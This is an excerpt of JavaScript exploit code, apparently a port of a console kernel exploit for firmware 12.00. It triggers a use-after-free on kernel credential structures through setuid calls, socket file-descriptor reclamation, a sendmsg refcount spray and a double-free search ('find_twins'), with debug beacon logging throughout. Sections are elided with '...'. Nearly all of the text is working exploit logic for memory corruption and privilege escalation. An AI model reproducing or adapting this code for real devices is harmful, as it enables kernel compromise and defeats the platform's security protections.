...
// 2026-08-08 MEASURED: self=all = STUCK state, not slow convergence.
// Winnable runs land under 256 (bimodal), so 512 catches every winnable run.
// FW 12.00 has a tighter race; if you see "self=all exhausted" on FW 12.00,
// try increasing this to 1024 or 2048 as a workaround (slower but more tolerant).
...
const REFCNT_SENDMSG_N = 0x80;  // 128 sendmsg calls to reset cr_refcnt
// Upstream poops.c uses 0x80 (matches Poops.java). On FW 12.00 if you see
// "self=all exhausted", try increasing to 0x100 (256) to be more aggressive.
...
function find_twins() {
    ...
    beacon("[DEBUG] find_twins starting with TWIN_ATTEMPTS=" + TWIN_ATTEMPTS);
...
function ucred_triple_free() {
    ...
    const uid0 = sys.getuid();
    beacon("[CRITICAL] Before setuid#1: uid=" + uid0);
    const su1 = sys.setuid(1);                   // allocate a fresh ucred
    beacon("[CRITICAL] After setuid#1: result=" + su1 + " (should be 0)");
    ST.uaf_sock = sys.socket(AF_UNIX, SOCK_STREAM, 0);
    beacon("[CRITICAL] Created uaf_sock: fd=" + ST.uaf_sock);
    const su2 = sys.setuid(1);                   // free the previous one
    beacon("[CRITICAL] After setuid#2: result=" + su2 + " (should be 0)");
    beacon("setuid uid_before=" + uid0 + " setuid#1=" + su1 + " setuid#2=" + su2
           + " uid_now=" + sys.getuid());
    if (su1 !== 0 || su2 !== 0) {
        beacon("[CRITICAL] SETUID FAILED - this is likely the root cause");
    ...
    beacon("[CRITICAL] FD Reclamation: dummy_sock=" + dummy_sock + " uaf_sock=" + ST.uaf_sock);
    for (let i = 0; ST.uaf_sock !== dummy_sock && i < 32; i++) {
        const stray = ST.uaf_sock;
        beacon("[DEBUG] Reclaim attempt " + i + ": got fd " + stray + ", need " + dummy_sock);
        ST.uaf_sock = sys.socket(AF_UNIX, SOCK_STREAM, 0);
        sys.close(stray);                        // free the one that took it
    }
    if (ST.uaf_sock !== dummy_sock) {
        beacon("[CRITICAL] FD RECLAMATION FAILED - this could be the root cause");
    ...
    beacon("[CRITICAL] CLEAR_QUEUE: uaf_sock=" + ST.uaf_sock + " slot=" + ST.nc_slot);
    ...
    beacon("CLEAR_QUEUE -> " + clr + " (fd " + ST.uaf_sock + ", result should be 0)");
    if (clr !== 0) {
        beacon("[CRITICAL] CLEAR_QUEUE FAILED - this would prevent double-free");
    ...
    beacon("[CRITICAL] Calling doubleFreeAndFindTwins (batched same-core)");
    const twinsOk = doubleFreeAndFindTwins();
    beacon("phase: double-free + find_twins (batched same-core) result=" + twinsOk);
    if (!twinsOk) {
        beacon("[CRITICAL] TWINS NOT FOUND - likely the double-free failed or refcnt spray missed");
        throw new Error("ERR_TRIPLE_FREE: twins not found");
    }
